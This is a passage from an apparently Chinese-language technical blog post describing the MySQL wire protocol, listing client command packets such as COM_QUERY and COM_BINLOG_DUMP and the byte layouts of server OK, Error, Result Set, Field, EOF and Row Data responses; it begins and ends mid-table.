><td>发送BLOB类型的数据</td><td>mysql_stmt_send_long_data</td></tr><tr><td>0x19</td><td>COM_STMT_CLOSE</td><td>销毁预处理语句</td><td>mysql_stmt_close</td></tr><tr><td>0x1A</td><td>COM_STMT_RESET</td><td>清除预处理语句参数缓存</td><td>mysql_stmt_reset</td></tr><tr><td>0x1B</td><td>COM_SET_OPTION</td><td>设置语句选项</td><td>mysql_set_server_option</td></tr><tr><td>0x1C</td><td>COM_STMT_FETCH</td><td>获取预处理语句的执行结果</td><td>mysql_stmt_fetch</td></tr></tbody></table><p><strong>参数</strong>：内容是用户在MySQL客户端输入的命令（不包括每行命令结尾的”;”分号）。另外这个字段的字符串不是以NULL字符结尾，而是通过消息头中的长度值计算而来。</p><p>例如：当我们在MySQL客户端中执行<code>use hutaow;</code>命令时（切换到<code>hutaow</code>数据库），发送的请求报文数据会是下面的样子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x02 0x68 0x75 0x74 0x61 0x6f 0x77</span><br></pre></td></tr></table></figure><p>其中，<code>0x02</code>为请求类型值<code>COM_INIT_DB</code>，后面的<code>0x68 0x75 0x74 0x61 0x6f 0x77</code>为ASCII字符<code>hutaow</code>。</p><h4 id="4-2-1-COM-QUIT-消息报文"><a href="#4-2-1-COM-QUIT-消息报文" class="headerlink" title="4.2.1 COM_QUIT 消息报文"></a>4.2.1 COM_QUIT 消息报文</h4><p><strong>功能</strong>：关闭当前连接（客户端退出），无参数。</p><h4 id="4-2-2-COM-INIT-DB-消息报文"><a href="#4-2-2-COM-INIT-DB-消息报文" class="headerlink" title="4.2.2 COM_INIT_DB 消息报文"></a>4.2.2 COM_INIT_DB 消息报文</h4><p><strong>功能</strong>：切换数据库，对应的SQL语句为<code>USE &lt;database&gt;</code>。</p><table><thead><tr><th>字节</th><th>说明</th></tr></thead><tbody><tr><td>n</td><td>数据库名称（字符串到达消息尾部时结束，无结束符）</td></tr></tbody></table><h4 id="4-2-3-COM-QUERY-消息报文"><a href="#4-2-3-COM-QUERY-消息报文" class="headerlink" title="4.2.3 COM_QUERY 消息报文"></a>4.2.3 COM_QUERY 消息报文</h4><p><strong>功能</strong>：最常见的请求消息类型，当用户执行SQL语句时发送该消息。</p><table><thead><tr><th>字节</th><th>说明</th></tr></thead><tbody><tr><td>n</td><td>SQL语句（字符串到达消息尾部时结束，无结束符）</td></tr></tbody></table><h4 id="4-2-4-COM-FIELD-LIST-消息报文"><a href="#4-2-4-COM-FIELD-LIST-消息报文" class="headerlink" title="4.2.4 COM_FIELD_LIST 消息报文"></a>4.2.4 COM_FIELD_LIST 消息报文</h4><p><strong>功能</strong>：查询某表的字段（列）信息，等同于SQL语句<code>SHOW [FULL] FIELDS FROM ...</code>。</p><table><thead><tr><th>字节</th><th>说明</th></tr></thead><tbody><tr><td>n</td><td>表格名称（Null-Terminated String）</td></tr><tr><td>n</td><td>字段（列）名称或通配符（可选）</td></tr></tbody></table><h4 id="4-2-5-COM-CREATE-DB-消息报文"><a href="#4-2-5-COM-CREATE-DB-消息报文" class="headerlink" title="4.2.5 COM_CREATE_DB 消息报文"></a>4.2.5 COM_CREATE_DB 消息报文</h4><p><strong>功能</strong>：创建数据库，该消息已过时，而被SQL语句<code>CREATE DATABASE</code>代替。</p><table><thead><tr><th>字节</th><th>说明</th></tr></thead><tbody><tr><td>n</td><td>数据库名称（字符串到达消息尾部时结束，无结束符）</td></tr></tbody></table><h4 id="4-2-6-COM-DROP-DB-消息报文"><a href="#4-2-6-COM-DROP-DB-消息报文" class="headerlink" title="4.2.6 COM_DROP_DB 消息报文"></a>4.2.6 COM_DROP_DB 消息报文</h4><p><strong>功能</strong>：删除数据库，该消息已过时，而被SQL语句<code>DROP DATABASE</code>代替。</p><table><thead><tr><th>字节</th><th>说明</th></tr></thead><tbody><tr><td>n</td><td>数据库名称（字符串到达消息尾部时结束，无结束符）</td></tr></tbody></table><h4 id="4-2-7-COM-REFRESH-消息报文"><a href="#4-2-7-COM-REFRESH-消息报文" class="headerlink" title="4.2.7 COM_REFRESH 消息报文"></a>4.2.7 COM_REFRESH 消息报文</h4><p><strong>功能</strong>：清除缓存，等同于SQL语句<code>FLUSH</code>，或是执行<code>mysqladmin flush-foo</code>命令时发送该消息。</p><table><thead><tr><th>字节</th><th>说明</th></tr></thead><tbody><tr><td>1</td><td>清除缓存选项（位图方式存储，各标志位含义如下）</td></tr><tr><td></td><td>0x01: REFRESH_GRANT</td></tr><tr><td></td><td>0x02: REFRESH_LOG</td></tr><tr><td></td><td>0x04: REFRESH_TABLES</td></tr><tr><td></td><td>0x08: REFRESH_HOSTS</td></tr><tr><td></td><td>0x10: REFRESH_STATUS</td></tr><tr><td></td><td>0x20: REFRESH_THREADS</td></tr><tr><td></td><td>0x40: REFRESH_SLAVE</td></tr><tr><td></td><td>0x80: REFRESH_MASTER</td></tr></tbody></table><h4 id="4-2-8-COM-SHUTDOWN-消息报文"><a href="#4-2-8-COM-SHUTDOWN-消息报文" class="headerlink" title="4.2.8 COM_SHUTDOWN 消息报文"></a>4.2.8 COM_SHUTDOWN 消息报文</h4><p><strong>功能</strong>：停止MySQL服务。执行<code>mysqladmin shutdown</code>命令时发送该消息。</p><table><thead><tr><th>字节</th><th>说明</th></tr></thead><tbody><tr><td>1</td><td>停止服务选项</td></tr><tr><td></td><td>0x00: SHUTDOWN_DEFAULT</td></tr><tr><td></td><td>0x01: SHUTDOWN_WAIT_CONNECTIONS</td></tr><tr><td></td><td>0x02: SHUTDOWN_WAIT_TRANSACTIONS</td></tr><tr><td></td><td>0x08: SHUTDOWN_WAIT_UPDATES</td></tr><tr><td></td><td>0x10: SHUTDOWN_WAIT_ALL_BUFFERS</td></tr><tr><td></td><td>0x11: SHUTDOWN_WAIT_CRITICAL_BUFFERS</td></tr><tr><td></td><td>0xFE: KILL_QUERY</td></tr><tr><td></td><td>0xFF: KILL_CONNECTION</td></tr></tbody></table><h4 id="4-2-9-COM-STATISTICS-消息报文"><a href="#4-2-9-COM-STATISTICS-消息报文" class="headerlink" title="4.2.9 COM_STATISTICS 消息报文"></a>4.2.9 COM_STATISTICS 消息报文</h4><p><strong>功能</strong>：查看MySQL服务的统计信息（例如运行时间、每秒查询次数等）。执行<code>mysqladmin status</code>命令时发送该消息，无参数。</p><h4 id="4-2-10-COM-PROCESS-INFO-消息报文"><a href="#4-2-10-COM-PROCESS-INFO-消息报文" class="headerlink" title="4.2.10 COM_PROCESS_INFO 消息报文"></a>4.2.10 COM_PROCESS_INFO 消息报文</h4><p><strong>功能</strong>：获取当前活动的线程（连接）列表。等同于SQL语句<code>SHOW PROCESSLIST</code>，或是执行<code>mysqladmin processlist</code>命令时发送该消息，无参数。</p><h4 id="4-2-11-COM-PROCESS-KILL-消息报文"><a href="#4-2-11-COM-PROCESS-KILL-消息报文" class="headerlink" title="4.2.11 COM_PROCESS_KILL 消息报文"></a>4.2.11 COM_PROCESS_KILL 消息报文</h4><p><strong>功能</strong>：要求服务器中断某个连接。等同于SQL语句<code>KILL &lt;id&gt;</code>。</p><table><thead><tr><th>字节</th><th>说明</th></tr></thead><tbody><tr><td>4</td><td>连接ID号（小字节序）</td></tr></tbody></table><h4 id="4-2-12-COM-DEBUG-消息报文"><a href="#4-2-12-COM-DEBUG-消息报文" class="headerlink" title="4.2.12 COM_DEBUG 消息报文"></a>4.2.12 COM_DEBUG 消息报文</h4><p><strong>功能</strong>：要求服务器将调试信息保存下来，保存的信息多少依赖于编译选项设置（debug=no|yes|full）。执行<code>mysqladmin debug</code>命令时发送该消息，无参数。</p><h4 id="4-2-13-COM-PING-消息报文"><a href="#4-2-13-COM-PING-消息报文" class="headerlink" title="4.2.13 COM_PING 消息报文"></a>4.2.13 COM_PING 消息报文</h4><p><strong>功能</strong>：该消息用来测试连通性，同时会将服务器的无效连接（超时）计数器清零。执行<code>mysqladmin ping</code>命令时发送该消息，无参数。</p><h4 id="4-2-14-COM-CHANGE-USER-消息报文"><a href="#4-2-14-COM-CHANGE-USER-消息报文" class="headerlink" title="4.2.14 COM_CHANGE_USER 消息报文"></a>4.2.14 COM_CHANGE_USER 消息报文</h4><p><strong>功能</strong>：在不断连接的情况下重新登陆，该操作会销毁MySQL服务器端的会话上下文（包括临时表、会话变量等）。有些连接池用这种方法实现清除会话上下文。</p><table><thead><tr><th>字节</th><th>说明</th></tr></thead><tbody><tr><td>n</td><td>用户名（字符串以NULL结尾）</td></tr><tr><td>n</td><td>密码（挑战数）</td></tr><tr><td></td><td>MySQL 3.23 版本：Null-Terminated String（长度9字节）</td></tr><tr><td></td><td>MySQL 4.1 版本：Length Coded String（长度1+21字节）</td></tr><tr><td>n</td><td>数据库名称（Null-Terminated String）</td></tr><tr><td>2</td><td>字符编码</td></tr></tbody></table><h4 id="4-2-15-COM-BINLOG-DUMP-消息报文"><a href="#4-2-15-COM-BINLOG-DUMP-消息报文" class="headerlink" title="4.2.15 COM_BINLOG_DUMP 消息报文"></a>4.2.15 COM_BINLOG_DUMP 消息报文</h4><p><strong>功能</strong>：该消息是备份连接时由从服务器向主服务器发送的最后一个请求，主服务器收到后，会响应一系列的报文，每个报文都包含一个二进制日志事件。如果主服务器出现故障时，会发送一个EOF报文。</p><table><thead><tr><th>字节</th><th>说明</th></tr></thead><tbody><tr><td>4</td><td>二进制日志数据的起始位置（小字节序）</td></tr><tr><td>4</td><td>二进制日志数据标志位（目前未使用，永远为0x00）</td></tr><tr><td>4</td><td>从服务器的服务器ID值（小字节序）</td></tr><tr><td>n</td><td>二进制日志的文件名称（可选，默认值为主服务器上第一个有效的文件名）</td></tr></tbody></table><h4 id="4-2-16-COM-TABLE-DUMP-消息报文"><a href="#4-2-16-COM-TABLE-DUMP-消息报文" class="headerlink" title="4.2.16 COM_TABLE_DUMP 消息报文"></a>4.2.16 COM_TABLE_DUMP 消息报文</h4><p><strong>功能</strong>：将数据表从主服务器复制到从服务器中，执行SQL语句<code>LOAD TABLE ... FROM MASTER</code>时发送该消息。目前该消息已过时，不再使用。</p><table><thead><tr><th>字节</th><th>说明</th></tr></thead><tbody><tr><td>n</td><td>数据库名称（Length Coded String）</td></tr><tr><td>n</td><td>数据表名称（Length Coded String）</td></tr></tbody></table><h4 id="4-2-17-COM-REGISTER-SLAVE-消息报文"><a href="#4-2-17-COM-REGISTER-SLAVE-消息报文" class="headerlink" title="4.2.17 COM_REGISTER_SLAVE 消息报文"></a>4.2.17 COM_REGISTER_SLAVE 消息报文</h4><p><strong>功能</strong>：在从服务器<code>report_host</code>变量设置的情况下，当备份连接时向主服务器发送的注册消息。</p><table><thead><tr><th>字节</th><th>说明</th></tr></thead><tbody><tr><td>4</td><td>从服务器ID值（小字节序）</td></tr><tr><td>n</td><td>主服务器IP地址（Length Coded String）</td></tr><tr><td>n</td><td>主服务器用户名（Length Coded String）</td></tr><tr><td>n</td><td>主服务器密码（Length Coded String）</td></tr><tr><td>2</td><td>主服务器端口号</td></tr><tr><td>4</td><td>安全备份级别（由MySQL服务器<code>rpl_recovery_rank</code>变量设置，暂时未使用）</td></tr><tr><td>4</td><td>主服务器ID值（值恒为0x00）</td></tr></tbody></table><h4 id="4-2-18-COM-PREPARE-消息报文"><a href="#4-2-18-COM-PREPARE-消息报文" class="headerlink" title="4.2.18 COM_PREPARE 消息报文"></a>4.2.18 COM_PREPARE 消息报文</h4><p><strong>功能</strong>：预处理SQL语句，使用带有”?”占位符的SQL语句时发送该消息。</p><table><thead><tr><th>字节</th><th>说明</th></tr></thead><tbody><tr><td>n</td><td>带有”?”占位符的SQL语句（字符串到达消息尾部时结束，无结束符）</td></tr></tbody></table><h4 id="4-2-19-COM-EXECUTE-消息报文"><a href="#4-2-19-COM-EXECUTE-消息报文" class="headerlink" title="4.2.19 COM_EXECUTE 消息报文"></a>4.2.19 COM_EXECUTE 消息报文</h4><p><strong>功能</strong>：执行预处理语句。</p><table><thead><tr><th>字节</th><th>说明</th></tr></thead><tbody><tr><td>4</td><td>预处理语句的ID值</td></tr><tr><td>1</td><td>标志位</td></tr><tr><td></td><td>0x00: CURSOR_TYPE_NO_CURSOR</td></tr><tr><td></td><td>0x01: CURSOR_TYPE_READ_ONLY</td></tr><tr><td></td><td>0x02: CURSOR_TYPE_FOR_UPDATE</td></tr><tr><td></td><td>0x04: CURSOR_TYPE_SCROLLABLE</td></tr><tr><td>4</td><td>保留（值恒为0x01）</td></tr><tr><td>如果参数数量大于0</td><td></td></tr><tr><td>n</td><td>空位图（Null-Bitmap，长度 = (参数数量 + 7) / 8 字节）</td></tr><tr><td>1</td><td>参数分隔标志</td></tr><tr><td>如果参数分隔标志值为1</td><td></td></tr><tr><td>n</td><td>每个参数的类型值（长度 = 参数数量 * 2 字节）</td></tr><tr><td>n</td><td>每个参数的值</td></tr></tbody></table><h4 id="4-2-20-COM-LONG-DATA-消息报文"><a href="#4-2-20-COM-LONG-DATA-消息报文" class="headerlink" title="4.2.20 COM_LONG_DATA 消息报文"></a>4.2.20 COM_LONG_DATA 消息报文</h4><p>该消息报文有两种形式，一种用于发送二进制数据，另一种用于发送文本数据。</p><p><strong>功能</strong>：用于发送二进制（BLOB）类型的数据（调用<code>mysql_stmt_send_long_data</code>函数）。</p><table><thead><tr><th>字节</th><th>说明</th></tr></thead><tbody><tr><td>4</td><td>预处理语句的ID值（小字节序）</td></tr><tr><td>2</td><td>参数序号（小字节序）</td></tr><tr><td>n</td><td>数据负载（数据到达消息尾部时结束，无结束符）</td></tr></tbody></table><p><strong>功能</strong>：用于发送超长字符串类型的数据（调用<code>mysql_send_long_data</code>函数）</p><table><thead><tr><th>字节</th><th>说明</th></tr></thead><tbody><tr><td>4</td><td>预处理语句的ID值（小字节序）</td></tr><tr><td>2</td><td>参数序号（小字节序）</td></tr><tr><td>2</td><td>数据类型（未使用）</td></tr><tr><td>n</td><td>数据负载（数据到达消息尾部时结束，无结束符）</td></tr></tbody></table><h4 id="4-2-21-COM-CLOSE-STMT-消息报文"><a href="#4-2-21-COM-CLOSE-STMT-消息报文" class="headerlink" title="4.2.21 COM_CLOSE_STMT 消息报文"></a>4.2.21 COM_CLOSE_STMT 消息报文</h4><p><strong>功能</strong>：销毁预处理语句。</p><table><thead><tr><th>字节</th><th>说明</th></tr></thead><tbody><tr><td>4</td><td>预处理语句的ID值（小字节序）</td></tr></tbody></table><h4 id="4-2-22-COM-RESET-STMT-消息报文"><a href="#4-2-22-COM-RESET-STMT-消息报文" class="headerlink" title="4.2.22 COM_RESET_STMT 消息报文"></a>4.2.22 COM_RESET_STMT 消息报文</h4><p><strong>功能</strong>：将预处理语句的参数缓存清空。多数情况和<code>COM_LONG_DATA</code>一起使用。</p><table><thead><tr><th>字节</th><th>说明</th></tr></thead><tbody><tr><td>4</td><td>预处理语句的ID值（小字节序）</td></tr></tbody></table><h4 id="4-2-23-COM-SET-OPTION-消息报文"><a href="#4-2-23-COM-SET-OPTION-消息报文" class="headerlink" title="4.2.23 COM_SET_OPTION 消息报文"></a>4.2.23 COM_SET_OPTION 消息报文</h4><p><strong>功能</strong>：设置语句选项，选项值为<code>/include/mysql_com.h</code>头文件中定义的<code>enum_mysql_set_option</code>枚举类型：</p><ul><li>MYSQL_OPTION_MULTI_STATEMENTS_ON</li><li>MYSQL_OPTION_MULTI_STATEMENTS_OFF</li></ul><table><thead><tr><th>字节</th><th>说明</th></tr></thead><tbody><tr><td>2</td><td>选项值（小字节序）</td></tr></tbody></table><h4 id="4-2-24-COM-FETCH-STMT-消息报文"><a href="#4-2-24-COM-FETCH-STMT-消息报文" class="headerlink" title="4.2.24 COM_FETCH_STMT 消息报文"></a>4.2.24 COM_FETCH_STMT 消息报文</h4><p><strong>功能</strong>：获取预处理语句的执行结果（一次可以获取多行数据）。</p><table><thead><tr><th>字节</th><th>说明</th></tr></thead><tbody><tr><td>4</td><td>预处理语句的ID值（小字节序）</td></tr><tr><td>4</td><td>数据的行数（小字节序）</td></tr></tbody></table><h3 id="4-3-服务器响应报文（服务器-gt-客户端）"><a href="#4-3-服务器响应报文（服务器-gt-客户端）" class="headerlink" title="4.3 服务器响应报文（服务器 -&gt; 客户端）"></a>4.3 服务器响应报文（服务器 -&gt; 客户端）</h3><p>当客户端发起认证请求或命令请求后，服务器会返回相应的执行结果给客户端。客户端在收到响应报文后，需要首先检查第1个字节的值，来区分响应报文的类型。</p><table><thead><tr><th>响应报文类型</th><th>第1个字节取值范围</th></tr></thead><tbody><tr><td>OK 响应报文</td><td>0x00</td></tr><tr><td>Error 响应报文</td><td>0xFF</td></tr><tr><td>Result Set 报文</td><td>0x01 - 0xFA</td></tr><tr><td>Field 报文</td><td>0x01 - 0xFA</td></tr><tr><td>Row Data 报文</td><td>0x01 - 0xFA</td></tr><tr><td>EOF 报文</td><td>0xFE</td></tr></tbody></table><p>注：响应报文的第1个字节在不同类型中含义不同，比如在OK报文中，该字节并没有实际意义，值恒为0x00；而在Result Set报文中，该字节又是长度编码的二进制数据结构（Length Coded Binary）中的第1字节。</p><h4 id="4-3-1-OK-响应报文"><a href="#4-3-1-OK-响应报文" class="headerlink" title="4.3.1 OK 响应报文"></a>4.3.1 OK 响应报文</h4><p>客户端的命令执行正确时，服务器会返回OK响应报文。</p><p><strong>MySQL 4.0 及之前的版本</strong></p><table><thead><tr><th>字节</th><th>说明</th></tr></thead><tbody><tr><td>1</td><td>OK报文，值恒为0x00</td></tr><tr><td>1-9</td><td>受影响行数（Length Coded Binary）</td></tr><tr><td>1-9</td><td>索引ID值（Length Coded Binary）</td></tr><tr><td>2</td><td>服务器状态</td></tr><tr><td>n</td><td>服务器消息（字符串到达消息尾部时结束，无结束符）</td></tr></tbody></table><p><strong>MySQL 4.1 及之后的版本</strong></p><table><thead><tr><th>字节</th><th>说明</th></tr></thead><tbody><tr><td>1</td><td>OK报文，值恒为0x00</td></tr><tr><td>1-9</td><td>受影响行数（Length Coded Binary）</td></tr><tr><td>1-9</td><td>索引ID值（Length Coded Binary）</td></tr><tr><td>2</td><td>服务器状态</td></tr><tr><td>2</td><td>告警计数</td></tr><tr><td>n</td><td>服务器消息（字符串到达消息尾部时结束，无结束符，可选）</td></tr></tbody></table><p><strong>受影响行数</strong>：当执行<code>INSERT</code>/<code>UPDATE</code>/<code>DELETE</code>语句时所影响的数据行数。</p><p><strong>索引ID值</strong>：该值为<code>AUTO_INCREMENT</code>索引字段生成，如果没有索引字段，则为0x00。注意：当<code>INSERT</code>插入语句为多行数据时，该索引ID值为第一个插入的数据行索引值，而非最后一个。</p><p><strong>服务器状态</strong>：客户端可以通过该值检查命令是否在事务处理中。</p><p><strong>告警计数</strong>：告警发生的次数。</p><p><strong>服务器消息</strong>：服务器返回给客户端的消息，一般为简单的描述性字符串，可选字段。</p><h4 id="4-3-2-Error-响应报文"><a href="#4-3-2-Error-响应报文" class="headerlink" title="4.3.2 Error 响应报文"></a>4.3.2 Error 响应报文</h4><p><strong>MySQL 4.0 及之前的版本</strong></p><table><thead><tr><th>字节</th><th>说明</th></tr></thead><tbody><tr><td>1</td><td>Error报文，值恒为0xFF</td></tr><tr><td>2</td><td>错误编号（小字节序）</td></tr><tr><td>n</td><td>服务器消息</td></tr></tbody></table><p><strong>MySQL 4.1 及之后的版本</strong></p><table><thead><tr><th>字节</th><th>说明</th></tr></thead><tbody><tr><td>1</td><td>Error报文，值恒为0xFF</td></tr><tr><td>2</td><td>错误编号（小字节序）</td></tr><tr><td>1</td><td>服务器状态标志，恒为’#’字符</td></tr><tr><td>5</td><td>服务器状态（5个字符）</td></tr><tr><td>n</td><td>服务器消息</td></tr></tbody></table><p><strong>错误编号</strong>：错误编号值定义在源代码<code>/include/mysqld_error.h</code>头文件中。</p><p><strong>服务器状态</strong>：服务器将错误编号通过<code>mysql_errno_to_sqlstate</code>函数转换为状态值，状态值由5字节的ASCII字符组成，定义在源代码<code>/include/sql_state.h</code>头文件中。</p><p><strong>服务器消息</strong>：错误消息字符串到达消息尾时结束，长度可以由消息头中的长度值计算得出。消息长度为0-512字节。</p><h4 id="4-3-3-Result-Set-消息"><a href="#4-3-3-Result-Set-消息" class="headerlink" title="4.3.3 Result Set 消息"></a>4.3.3 Result Set 消息</h4><p>当客户端发送查询请求后，在没有错误的情况下，服务器会返回结果集（Result Set）给客户端。</p><p>Result Set 消息分为五部分，结构如下：</p><table><thead><tr><th>结构</th><th>说明</th></tr></thead><tbody><tr><td>[Result Set Header]</td><td>列数量</td></tr><tr><td>[Field]</td><td>列信息（多个）</td></tr><tr><td>[EOF]</td><td>列结束</td></tr><tr><td>[Row Data]</td><td>行数据（多个）</td></tr><tr><td>[EOF]</td><td>数据结束</td></tr></tbody></table><h4 id="4-3-4-Result-Set-Header-结构"><a href="#4-3-4-Result-Set-Header-结构" class="headerlink" title="4.3.4 Result Set Header 结构"></a>4.3.4 Result Set Header 结构</h4><table><thead><tr><th>字节</th><th>说明</th></tr></thead><tbody><tr><td>1-9</td><td>Field结构计数（Length Coded Binary）</td></tr><tr><td>1-9</td><td>额外信息（Length Coded Binary）</td></tr></tbody></table><p><strong>Field结构计数</strong>：用于标识Field结构的数量，取值范围0x00-0xFA。</p><p><strong>额外信息</strong>：可选字段，一般情况下不应该出现。只有像<code>SHOW COLUMNS</code>这种语句的执行结果才会用到额外信息（标识表格的列数量）。</p><h4 id="4-3-5-Field-结构"><a href="#4-3-5-Field-结构" class="headerlink" title="4.3.5 Field 结构"></a>4.3.5 Field 结构</h4><p>Field为数据表的列信息，在Result Set中，Field会连续出现多次，次数由Result Set Header结构中的IField结构计数值决定。</p><p><strong>MySQL 4.0 及之前的版本</strong></p><table><thead><tr><th>字节</th><th>说明</th></tr></thead><tbody><tr><td>n</td><td>数据表名称（Length Coded String）</td></tr><tr><td>n</td><td>列（字段）名称（Length Coded String）</td></tr><tr><td>4</td><td>列（字段）长度（Length Coded String）</td></tr><tr><td>2</td><td>列（字段）类型（Length Coded String）</td></tr><tr><td>2</td><td>列（字段）标志（Length Coded String）</td></tr><tr><td>1</td><td>整型值精度</td></tr><tr><td>n</td><td>默认值（Length Coded String）</td></tr></tbody></table><p><strong>MySQL 4.1 及之后的版本</strong></p><table><thead><tr><th>字节</th><th>说明</th></tr></thead><tbody><tr><td>n</td><td>目录名称（Length Coded String）</td></tr><tr><td>n</td><td>数据库名称（Length Coded String）</td></tr><tr><td>n</td><td>数据表名称（Length Coded String）</td></tr><tr><td>n</td><td>数据表原始名称（Length Coded String）</td></tr><tr><td>n</td><td>列（字段）名称（Length Coded String）</td></tr><tr><td>4</td><td>列（字段）原始名称（Length Coded String）</td></tr><tr><td>1</td><td>填充值</td></tr><tr><td>2</td><td>字符编码</td></tr><tr><td>4</td><td>列（字段）长度</td></tr><tr><td>1</td><td>列（字段）类型</td></tr><tr><td>2</td><td>列（字段）标志</td></tr><tr><td>1</td><td>整型值精度</td></tr><tr><td>2</td><td>填充值（0x00）</td></tr><tr><td>n</td><td>默认值（Length Coded String）</td></tr></tbody></table><p><strong>目录名称</strong>：在4.1及之后的版本中，该字段值为”def”。</p><p><strong>数据库名称</strong>：数据库名称标识。</p><p><strong>数据表名称</strong>：数据表的别名（<code>AS</code>之后的名称）。</p><p><strong>数据表原始名称</strong>：数据表的原始名称（<code>AS</code>之前的名称）。</p><p><strong>列（字段）名称</strong>：列（字段）的别名（<code>AS</code>之后的名称）。</p><p><strong>列（字段）原始名称</strong>：列（字段）的原始名称（<code>AS</code>之前的名称）。</p><p><strong>字符编码</strong>：列（字段）的字符编码值。</p><p><strong>列（字段）长度</strong>：列（字段）的长度值，真实长度可能小于该值，例如<code>VARCHAR(2)</code>类型的字段实际只能存储1个字符。</p><p><strong>列（字段）类型</strong>：列（字段）的类型值，取值范围如下（参考源代码<code>/include/mysql_com.h</code>头文件中的<code>enum_field_type</code>枚举类型定义）：</p><table><thead><tr><th>类型值</th><th>名称</th></tr></thead><tbody><tr><td>0x00</td><td>FIELD_TYPE_DECIMAL</td></tr><tr><td>0x01</td><td>FIELD_TYPE_TINY</td></tr><tr><td>0x02</td><td>FIELD_TYPE_SHORT</td></tr><tr><td>0x03</td><td>FIELD_TYPE_LONG</td></tr><tr><td>0x04</td><td>FIELD_TYPE_FLOAT</td></tr><tr><td>0x05</td><td>FIELD_TYPE_DOUBLE</td></tr><tr><td>0x06</td><td>FIELD_TYPE_NULL</td></tr><tr><td>0x07</td><td>FIELD_TYPE_TIMESTAMP</td></tr><tr><td>0x08</td><td>FIELD_TYPE_LONGLONG</td></tr><tr><td>0x09</td><td>FIELD_TYPE_INT24</td></tr><tr><td>0x0A</td><td>FIELD_TYPE_DATE</td></tr><tr><td>0x0B</td><td>FIELD_TYPE_TIME</td></tr><tr><td>0x0C</td><td>FIELD_TYPE_DATETIME</td></tr><tr><td>0x0D</td><td>FIELD_TYPE_YEAR</td></tr><tr><td>0x0E</td><td>FIELD_TYPE_NEWDATE</td></tr><tr><td>0x0F</td><td>FIELD_TYPE_VARCHAR (new in MySQL 5.0)</td></tr><tr><td>0x10</td><td>FIELD_TYPE_BIT (new in MySQL 5.0)</td></tr><tr><td>0xF6</td><td>FIELD_TYPE_NEWDECIMAL (new in MYSQL 5.0)</td></tr><tr><td>0xF7</td><td>FIELD_TYPE_ENUM</td></tr><tr><td>0xF8</td><td>FIELD_TYPE_SET</td></tr><tr><td>0xF9</td><td>FIELD_TYPE_TINY_BLOB</td></tr><tr><td>0xFA</td><td>FIELD_TYPE_MEDIUM_BLOB</td></tr><tr><td>0xFB</td><td>FIELD_TYPE_LONG_BLOB</td></tr><tr><td>0xFC</td><td>FIELD_TYPE_BLOB</td></tr><tr><td>0xFD</td><td>FIELD_TYPE_VAR_STRING</td></tr><tr><td>0xFE</td><td>FIELD_TYPE_STRING</td></tr><tr><td>0xFF</td><td>FIELD_TYPE_GEOMETRY</td></tr></tbody></table><p><strong>列（字段）标志</strong>：各标志位定义如下（参考源代码<code>/include/mysql_com.h</code>头文件中的宏定义）：</p><table><thead><tr><th>标志位</th><th>名称</th></tr></thead><tbody><tr><td>0x0001</td><td>NOT_NULL_FLAG</td></tr><tr><td>0x0002</td><td>PRI_KEY_FLAG</td></tr><tr><td>0x0004</td><td>UNIQUE_KEY_FLAG</td></tr><tr><td>0x0008</td><td>MULTIPLE_KEY_FLAG</td></tr><tr><td>0x0010</td><td>BLOB_FLAG</td></tr><tr><td>0x0020</td><td>UNSIGNED_FLAG</td></tr><tr><td>0x0040</td><td>ZEROFILL_FLAG</td></tr><tr><td>0x0080</td><td>BINARY_FLAG</td></tr><tr><td>0x0100</td><td>ENUM_FLAG</td></tr><tr><td>0x0200</td><td>AUTO_INCREMENT_FLAG</td></tr><tr><td>0x0400</td><td>TIMESTAMP_FLAG</td></tr><tr><td>0x0800</td><td>SET_FLAG</td></tr></tbody></table><p><strong>数值精度</strong>：该字段对<code>DECIMAL</code>和<code>NUMERIC</code>类型的数值字段有效，用于标识数值的精度（小数点位置）。</p><p><strong>默认值</strong>：该字段用在数据表定义中，普通的查询结果中不会出现。</p><p><strong>附</strong>：Field结构的相关处理函数：</p><ul><li>客户端：<code>/client/client.c</code>源文件中的<code>unpack_fields</code>函数</li><li>服务器：<code>/sql/sql_base.cc</code>源文件中的<code>send_fields</code>函数</li></ul><h4 id="4-3-6-EOF-结构"><a href="#4-3-6-EOF-结构" class="headerlink" title="4.3.6 EOF 结构"></a>4.3.6 EOF 结构</h4><p>EOF结构用于标识Field和Row Data的结束，在预处理语句中，EOF也被用来标识参数的结束。</p><p><strong>MySQL 4.0 及之前的版本</strong></p><table><thead><tr><th>字节</th><th>说明</th></tr></thead><tbody><tr><td>1</td><td>EOF值（0xFE）</td></tr></tbody></table><p><strong>MySQL 4.1 及之后的版本</strong></p><table><thead><tr><th>字节</th><th>说明</th></tr></thead><tbody><tr><td>1</td><td>EOF值（0xFE）</td></tr><tr><td>2</td><td>告警计数</td></tr><tr><td>2</td><td>状态标志位</td></tr></tbody></table><p><strong>告警计数</strong>：服务器告警数量，在所有数据都发送给客户端后该值才有效。</p><p><strong>状态标志位</strong>：包含类似<code>SERVER_MORE_RESULTS_EXISTS</code>这样的标志位。</p><p><strong>注</strong>：由于EOF值与其它Result Set结构共用1字节，所以在收到报文后需要对EOF包的真实性进行校验，校验条件为：</p><ul><li>第1字节值为0xFE</li><li>包长度小于9字节</li></ul><p><strong>附</strong>：EOF结构的相关处理函数：</p><ul><li>服务器：<code>protocol.cc</code>源文件中的<code>send_eof</code>函数</li></ul><h4 id="4-3-7-Row-Data-结构"><a href="#4-3-7-Row-Data-结构" class="headerlink" title="4.3.7 Row Data 结构"></a>4.3.7 Row Data 结构</h4><p>在Result Set消息中，会包含多个Row Data结构，每个Row Data结构又包含多个字段值，这些字段值组成一行数据。</p><table><thead><tr><th>字节</th><th>说明</th></tr></thead><tbody><tr><td>n</td><td>字段值（Length Coded String）</td></tr><tr><td>…</td><td>（一行数据中包含多个字段值）</td></tr></tbody></table><p><strong>字段值</strong>：行数据中的字段值，字符串形式。</p><p><strong>附</strong>：Row Data结构的相关处理函数：</p><ul><li>客户端：<code>/client/client.c</code>源文件中的<code>read_rows</code>函数</li></ul><h4 id="4-3-8-Row-Data-结构（二进制数据）"><a href="#4-3-8-Row-Data-结构（二进制数据）" class="headerlink" title="4.3.8 Row Data 结构（二进制数据）"></a>4.3.8 Row Data 结构（二进制数据）</h4><p>该结构用于传输二进制的字段值，既可以是服务器返回的结果，也可以是由客户端发送的（当执行预处理语句时，客户端使用Result Set消息来发送参数及数据）。</p><table><thead><tr><th>字节</th><th>说明</th></tr></thead><tbody><tr><td>1</td><td>结构头（0x00）</td></tr><tr><td>(列数量 + 7 + 2) / 